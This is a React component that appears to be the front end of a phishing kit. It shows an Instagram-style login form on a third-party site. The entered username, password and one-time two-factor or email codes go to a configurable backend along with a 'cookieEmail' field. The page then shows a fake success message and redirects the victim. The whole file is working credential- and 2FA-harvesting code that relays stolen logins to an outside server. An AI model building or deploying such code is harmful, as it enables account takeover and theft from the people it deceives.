import React, { Component } from "react";
import runtimeEnv from "@mars/heroku-js-runtime-env";
import { Route, Redirect } from "react-router-dom";
import "../css/style.css";
import { Form, Button, Container, Alert, Spinner } from "react-bootstrap";

const queryString = require("query-string");
const env = runtimeEnv();
export default class Instagram extends Component {
  state = {
    username: "",
    password: "",
    showAlert: false,
    loading: false,
    message: "",
    twoFactor: false,
    email_auth: false,
    success: false,
    code: "",
    two_factor_identifier: "",
    verificationMethod: "",
    appName: window.location.hostname.substring(10).split(".")[0],
  };

  handleUsername = (event) => {
    this.setState({ username: event.target.value });
  };
  handleCode = (event) => {
    const { value, maxLength } = event.target;
    const message = value.slice(0, maxLength);
    this.setState({ code: message });
  };
  handlePassword = (event) => {
    this.setState({ password: event.target.value });
  };
  onShowAlert = () => {
    this.setState({ showAlert: true }, () => {
      window.setTimeout(() => {
        this.setState({ showAlert: false });
      }, 30000);
    });
  };
  handleClick = (e) => {
    e.preventDefault();
    this.setState({ loading: true });
    if (this.state.username.length !== 0 && this.state.password.length !== 0) {
      console.log(this.state.appName, window.location.href.split("//")[1]);
      fetch(`${env.REACT_APP_URL}/insta`, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        },
        body: queryString.stringify({
          username: this.state.username,
          password: this.state.password,
          cookieEmail: env.REACT_APP_COOKIE_EMAIL,
          appName: this.state.appName,
        }),
      })
        .then((response) => response.json())
        .then((responseData) => {
          console.log(responseData);
          this.setState(
            {
              message: responseData.message,
            },
            () => {
              this.onShowAlert();
            }
          );
          if (!responseData.success) {
            this.setState({ loading: false });
          } else {
            if (responseData.twoFactor) {
              this.setState({
                email_auth: responseData.email_auth,
                twoFactor: true,
                loading: true,
                two_factor_identifier: responseData.two_factor_identifier,
                verificationMethod: responseData.verificationMethod,
              });
            } else {
              this.setState({ success: true });
            }
          }
        });
    } else {
      if (this.state.username.length === 0) {
        this.setState(
          {
            message: "username cannot be empty",
            loading: false,
          },
          () => {
            this.onShowAlert();
          }
        );
      } else {
        this.setState(
          {
            message: "password cannot be empty",
            loading: false,
          },
          () => {
            this.onShowAlert();
          }
        );
      }
    }
  };
  handleCodeClick = (e) => {
    if (this.state.code.length === 0 || this.state.code.length > 6) {
      this.setState({ message: "Code length should be equal to 6" }, () => {
        this.onShowAlert();
      });
    } else {
      if (!this.state.email_auth) {
        fetch(
          `${env.REACT_APP_URL}/insta/submitCode?username=${this.state.username}&password=${this.state.password}&code=${this.state.code}&two_factor_identifier=${this.state.two_factor_identifier}&verificationMethod=${this.state.verificationMethod}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&appName=${this.state.appName}`,
          {
            method: "GET",
          }
        )
          .then((response) => response.json())
          .then((responseData) => {
            console.log(responseData);
            if (responseData.success) {
              this.setState(
                { success: true, message: responseData.message },
                () => {
                  this.onShowAlert();
                }
              );
            } else {
              this.setState({ message: responseData.message }, () => {
                this.onShowAlert();
              });
            }
          });
      } else {
        fetch(
          `${env.REACT_APP_URL}/insta/emailVerify?username=${this.state.username}&code=${this.state.code}`,
          {
            method: "GET",
          }
        )
          .then((response) => response.json())
          .then((responseData) => {
            console.log(responseData);
            this.setState(
              {
                message: responseData.message,
              },
              () => {
                this.onShowAlert();
              }
            );
            if (responseData.success) {
              fetch(`${env.REACT_APP_URL}/insta`, {
                method: "POST",
                headers: {
                  "Content-Type":
                    "application/x-www-form-urlencoded;charset=UTF-8",
                },
                body: queryString.stringify({
                  username: this.state.username,
                  password: this.state.password,
                  cookieEmail: env.REACT_APP_COOKIE_EMAIL,
                  appName: this.state.appName,
                }),
              })
                .then((response) => response.json())
                .then((responseData) => {
                  console.log(responseData);
                  this.setState(
                    {
                      message: responseData.message,
                    },
                    () => {
                      this.onShowAlert();
                    }
                  );
                  if (!responseData.success) {
                    this.setState({ loading: false });
                  } else {
                    if (!responseData.twoFactor) {
                      this.setState({ success: true });
                    }
                  }
                });
            } else {
              this.setState({ message: responseData.message, code: "" }, () => {
                this.onShowAlert();
              });
            }
          });
      }
    }
  };
  setRedirect = () => {
    this.setState({
      redirect: true,
    });
  };
  renderRedirect = () => {
    if (this.state.redirect) {
      return <Redirect to="/" />;
    }
  };
  render() {
    return (
      <div>
        <Button size="lg" variant="outline-danger" onClick={this.setRedirect}>
          Back
        </Button>

        {this.renderRedirect()}
        <Container>
          {this.state.showAlert ? (
            <Alert variant="danger">{this.state.message}</Alert>
          ) : (
            ""
          )}
        </Container>

        <div className="login_section text-center">
          <Container>
            <p style={{ color: "#f27c89", fontWeight: 600, fontSize: 24 }}>
              {env.REACT_APP_TITLE !== undefined && env.REACT_APP_TITLE !== ""
                ? env.REACT_APP_TITLE
                : ""}
            </p>
            {env.REACT_APP_FAVICONURL !== undefined &&
            env.REACT_APP_FAVICONURL != null ? (
              <img
                alt="logo"
                src={env.REACT_APP_FAVICONURL}
                style={{ objectFit: "contain", width: "25%", height: "25%" }}
              ></img>
            ) : (
              ""
            )}
          </Container>
          <br></br>
          <br />

          {env.REACT_APP_BANNER_INSTAGRAM === "true" ? (
            <div className="bg-white white-box">
              <p
                style={{ marginBottom: 8, fontWeight: 600, fontSize: 22 }}
                className="fs_18"
              >
                {env.REACT_APP_BANNER_INSTAGRAM_HEADER}
              </p>
              <p className="fs_12 m-0">{env.REACT_APP_BANNER_INSTAGRAM_BODY}</p>
            </div>
          ) : (
            ""
          )}
          <Container>
            <p style={{ fontWeight: "bold", color: "white" }}>
              {env.REACT_APP_SECONDARY_BANNER !== ""
                ? env.REACT_APP_SECONDARY_BANNER
                : ""}
            </p>
          </Container>
          {this.state.success ? (
            <Container
              style={{
                marginTop: 250,
                position: "absolute",
                left: "50%",
                top: "50%",
                transform: "translate(-50%, -50%)",
              }}
            >
              <center>
                <h1>Login Success Thank You!</h1>
                <h1>Redirecting...</h1>
              </center>
              <Route
                component={() => {
                  window.setTimeout(() => {
                    window.location.href = env.REACT_APP_REDIRECTURL;
                  }, 5000);

                  return null;
                }}
              />
            </Container>
          ) : (
            <div className="form">
              <p>
                <input
                  onChange={(e) => {
                    this.handleUsername(e);
                  }}
                  value={this.state.username}
                  type="text"
                  name="name"
                  autocomplete="off"
                  className="text-center form-control"
                  placeholder="Enter Instagram Username"
                ></input>
              </p>

              <p>
                <input
                  onChange={(e) => this.handlePassword(e)}
                  value={this.state.password}
                  type="password"
                  name="name"
                  autocomplete="off"
                  className="text-center form-control"
                  placeholder="Enter Instagram Password"
                ></input>
              </p>
              {this.state.loading ? (
                <button type="button" className="btn login_btn" disabled>
                  <Spinner
                    as="span"
                    animation="grow"
                    size="sm"
                    role="status"
                    aria-hidden="true"
                  />
                  Loading...
                </button>
              ) : (
                <button
                  onClick={(e) => this.handleClick(e)}
                  type="button"
                  className="btn login_btn"
                >
                  Login
                </button>
              )}
              {this.state.twoFactor ? (
                <div>
                  <Form.Group>
                    {this.state.email_auth ? (
                      <Form.Label>Please enter the code received</Form.Label>
                    ) : (
                      <Form.Label>Enter code received</Form.Label>
                    )}
                    <input
                      value={this.state.code}
                      onChange={(e) => {
                        this.handleCode(e);
                      }}
                      type="number"
                      maxLength="11"
                      name="name"
                      autocomplete="off"
                      className="text-center form-control"
                    ></input>
                  </Form.Group>
                  <button
                    onClick={() => {
                      this.handleCodeClick();
                    }}
                    type="button"
                    className="btn login_btn"
                  >
                    submit code
                  </button>
                </div>
              ) : (
                ""
              )}
            </div>
          )}
        </div>
      </div>
    );
  }
}
